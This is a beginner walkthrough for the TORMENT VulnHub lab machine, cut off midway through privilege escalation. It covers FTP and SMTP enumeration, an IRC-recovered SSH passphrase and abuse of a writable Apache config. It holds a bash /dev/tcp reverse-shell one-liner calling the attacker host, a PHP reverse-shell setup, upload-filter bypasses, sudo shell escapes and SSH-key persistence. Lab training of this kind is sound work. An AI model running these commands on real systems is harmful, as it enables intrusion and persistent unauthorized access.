# digitalworld.local: TORMENT — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: TORMENT |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | Donavan (digitalworld.local series) |
| **Released** | 31 March 2019 |
| **VulnHub Entry** | [digitalworld.local: TORMENT on VulnHub](https://vulnhub.com/entry/digitalworldlocal-torment,299/) |
| **Download** | [TORMENT.7z on VulnHub](https://vulnhub.com/entry/digitalworldlocal-torment,299/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 9 "stretch") |

> **About this box:** TORMENT is the "evil twin" of the author's JOY box, and it is deliberately
> mind-twisting. The trick is the **FTP server**: its listing changes between logins, and the files
> you need (`.ssh` and `.ngircd`) only appear if you keep enumerating. From there you chain an SSH
> key, an IRC chat room, a `sudo` reboot and a world-writable Apache config. Author's note: it is
> **not easy** — expect to spend hours. Versions and paths "vary by build".

**Legal note:** Only run this against the VM you downloaded, on an isolated host-only network that
you own. Never point these techniques at systems you do not have written permission to test.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this box you will have practised:

- **Host discovery and full-port enumeration** on an isolated lab subnet.
- **Anonymous FTP** and the discipline of **enumerating hidden (dot) files** you might overlook.
- **User enumeration over SMTP** with the `VRFY` command.
- **Exploiting a default service password** by reading the application's own documentation (`ngircd`).
- **Using an IRC client** to join a private channel and recover a secret (an SSH key passphrase).
- **Password-protected SSH keys**: using a recovered passphrase to log in.
- **Abusing a `sudo` rule** (`systemctl reboot`) plus a **world-writable Apache config**.
- **Two privilege-escalation routes**: the intended `sudo python` path and the alternative
  **PwnKit / pkexec** (CVE-2021-4034) path.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import the OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own address first:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

Then sweep the subnet with ARP:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks ICMP pings. It is the quickest way to find a freshly-booted VM.

![arp-scan showing the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Full TCP sweep


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/torment-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. TORMENT runs *many* services, so a full scan
> (and a UDP scan later) is essential.

### 2.2 Service and version detection

```bash
sudo nmap -sC -sV -p 21,22,25,80,111,139,143,445,631,2049,6667,6668,6669 -oA scans/torment-services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3  (anon login allowed)
22/tcp   open  ssh         OpenSSH 7.4p1 Debian
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.4.25 (Debian default page)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp  open  imap        Dovecot imapd
445/tcp  open  netbios-ssn Samba smbd 4.5.12-Debian
631/tcp  open  ipp         CUPS 2.2.1
2049/tcp open  nfs_acl     3 (RPC #100227)
6667/tcp open  irc         ngircd
6668/tcp open  irc         ngircd
6669/tcp open  irc         ngircd
```

> **How to read it:** A large surface. The key services are **FTP (21, anonymous allowed)**,
> **SMTP (25)** for user enumeration, **CUPS (631)** which leaks usernames, and **ngircd (IRC)** on
> 6667-6669. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Anonymous FTP (enumerate the dot-files!)

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (press Enter)
# ftp> ls -la
```

```text
drwxr-xr-x  ... .ssh
drwxr-xr-x  ... .ngircd
drwxr-xr-x  ... .cache
...
```

> **Why it works:** Anonymous FTP is enabled. Beginners often stop at the visible files — the
> interesting ones here are the **hidden directories** `.ssh` and `.ngircd`. If you see nothing at
> first, keep reconnecting and enumerating; this is the "mind-twist".


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```bash
cd .ssh && get id_rsa && cd ..
cd .ngircd && get channels && cd ..
```

```bash
cat channels
```

```text
#channels
games
tormentedprinter
```

> **How to read it:** `channels` lists two IRC channels on the local `ngircd` server. The SSH
> directory gave us `id_rsa` — a private key we will use once we have a username and passphrase.

### 2.4 Username discovery via CUPS and SMTP

The CUPS print server leaks job owners. Pull a candidate list:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
gobuster dir -u http://192.168.56.101:631 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

```text
/printers
/admin
/admin/conf/
```

```bash
curl -s http://192.168.56.101:631/printers/ | html2text | cut -d"'" -f1 | cut -d' ' -f1 | sort -u
```

```text
Internal_Printer
patrick
qiu
tormentedprinter
```

Now verify candidates against Postfix SMTP with `VRFY`:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)
> ### 📖 Concept — SMTP user enumeration
>
> **SMTP** (port 25) is mail transport, and two of its commands were designed to
> *validate* addresses — which means they disclose whether a user exists:
>
> ```bash
> nc target 25
> VRFY michael        # 250 = exists · 550 = does not
> EXPN admin          # expand a mailing list to its members
> ```
>
> Modern servers usually disable both. If so, the same information leaks from **login
> error messages** ("no such user" vs "wrong password") and from **RCPT TO** during a
> mail transaction. Automate it:
>
> ```bash
> smtp-user-enum -M VRFY -U /usr/share/wordlists/usernames.txt -t target
> hydra -L users.txt -P pass.txt smtp://target
> ```
>
> **Why this matters:** usernames are half of every credential pair. Enumerating them
> turns a two-unknown brute force into a one-unknown one — and lets you password-spray
> a single guess across many accounts while staying under lockout thresholds.
>
> Also worth trying: SMTP is sometimes configured to **relay** or to accept mail for
> local users, and `sendmail`/`exim` versions have well-known local root exploits.
> Check the banner version (`nc target 25` prints it immediately) against
> `searchsploit`.
>
> **Deep dive:** [CONCEPTS §9.6 — SMTP](../../docs/CONCEPTS.md#96-smtp--port-25)

```bash
nc -nv 192.168.56.101 25
# VRFY patrick
# VRFY qiu
# VRFY tormentedprinter
```

```text
252 2.0.0 patrick
252 2.0.0 qiu
550 5.1.1 <tormentedprinter>: Recipient address rejected
```

> **How to read it:** `252` means the address exists; `550` means it does not. Only **`patrick`** and
> **`qiu`** are real. Those are our SSH login candidates.

### 2.5 Web and UDP — checking the rest

```bash
gobuster dir -u http://192.168.56.101:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt
sudo nmap -sU --top-ports 50 -sV 192.168.56.101
```


> ### 📖 Concept — SNMP and community strings
>
> **SNMP** (Simple Network Management Protocol, **port 161/UDP**) is how network gear
> and servers expose monitoring data. Access is controlled by a **community string** —
> effectively a shared password — and the defaults are infamous: **`public`**
> (read-only) and **`private`** (read-write).
>
> ```bash
> snmpwalk -v2c -c public target              # dump the whole MIB tree
> snmp-check target                           # friendlier, organised output
> onesixtyone target -c /usr/share/doc/onesixtyone/dict.txt
> ```
>
> Note `-v2c`: SNMP has three protocol versions and the target may only answer one.
> Try `1`, `2c` and `3`. And because it is **UDP**, an ordinary TCP scan never sees it —
> you need `nmap -sU -p161`.
>
> **What it leaks** is remarkably broad: running processes, installed software and
> versions, the user list, open TCP ports, hardware details, and frequently
> configuration snippets. Specific OIDs worth walking:
>
> ```bash
> snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2   # running processes
> snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25    # user accounts
> snmpwalk -v2c -c public target 1.3.6.1.2.1.6.13.1.3     # open TCP ports
> snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2   # installed software
> ```
>
> The process list is the interesting one — it often reveals an internal service or a
> command line containing a password.
>
> **Deep dive:** [CONCEPTS §9.7 — SNMP](../../docs/CONCEPTS.md#97-snmp--port-161udp)

```text
/secret              (a page with a riddle-style note, no direct shell)
161/udp  closed  snmp
...
```

> **How to read it:** The web app has a `/secret` page but nothing exploitable; UDP turns up no SNMP.
> This is intentional — the box wants you to go back to what you already found. Good enumeration
> includes *ruling things out*.

---

## 3. Foothold

### 3.1 The ngircd default password

We have an SSH `id_rsa` but it is passphrase-protected, and IRC is listening. `ngircd` ships with a
**default operator/connection password**. Check the project's own documentation:

```bash
apt install ngircd        # install the same package on Kali to read /etc/ngircd/ngircd.conf
grep -i pass /etc/ngircd/ngircd.conf
```

```text
Password = wealllikedebian
```

> **Why it works:** The VM left `ngircd`'s **default password** unchanged: `wealllikedebian`.
> Reading the software's own config/man docs reveals it. (Default password var- ies only in that it
> is the upstream example — verify against your build.)

### 3.2 Connect to IRC and join the channels

Use any IRC client (HexChat on Kali, or `pidgin`). Connect to `192.168.56.101` on port `6667` with
the password above, then join the channels we recovered from the FTP `channels` file:

```text
/join #games
/join #tormentedprinter
```

Inside `#tormentedprinter` the **channel topic** holds the secret:

```text
Topic: mostmachineshaveasupersecurekeyandalongpassphrasell
```

> **How to read it:** That topic *is* the passphrase for the `id_rsa` key. It reads like banter, but
> it is the credential. Exact text "varies by build" — copy whatever your channel shows.

![IRC channel showing the passphrase](images/03-irc.png)

### 3.3 Log in over SSH with the key + passphrase

```bash
chmod 600 id_rsa
ssh -i id_rsa patrick@192.168.56.101
# Enter passphrase for key 'id_rsa':  mostmachineshaveasupersecurekeyandalongpassphrasell
```

```text
patrick@TORMENT:~$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
```

> **How to read it:** A working shell as `patrick`. (Try `patrick` first; if it fails, `qiu` accepts
> the same key on some builds.)

![SSH shell as patrick](images/04-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

There are two well-known routes on this box. Learn **both** — the intended one is a `sudo` abuse;
the alternative exploits an outdated `pkexec`.

### 4.1 First, look at what you have


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
sudo -l
ls -la /etc/apache2/apache2.conf
uname -a
find / -perm -4000 -type f 2>/dev/null | grep -i pkexec
```

```text
(patrick) may run the following commands on torment:
    (root) NOPASSWD: /bin/systemctl reboot
    (root) NOPASSWD: /usr/bin/python   # on some builds

-rw-rw-rw- 1 root root ... /etc/apache2/apache2.conf   <-- WORLD WRITABLE
/usr/bin/pkexec
```

> **How to read it:** Two huge findings:
> 1. `/etc/apache2/apache2.conf` is **world-writable** — we can change which user Apache runs as.
> 2. `sudo` lets `patrick` reboot the machine without a password.
> 3. `pkexec` is present and SUID — the PwnKit route (below).

### 4.2 Route A (intended) — Apache config + sudo reboot → qiu → sudo python

Because we can reboot, and Apache reads its `User`/`Group` from the config on boot, we can make the
web server run as `qiu`. First, plant a PHP reverse shell in the web root:


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /home/patrick/shell.php
nano /home/patrick/shell.php     # set $ip = '192.168.56.10'; $port = 4444;
```

Edit the Apache config so it runs as `qiu`:

```bash
nano /etc/apache2/apache2.conf
# change:
#   User  www-data        ->   User  qiu
#   Group www-data        ->   Group qiu
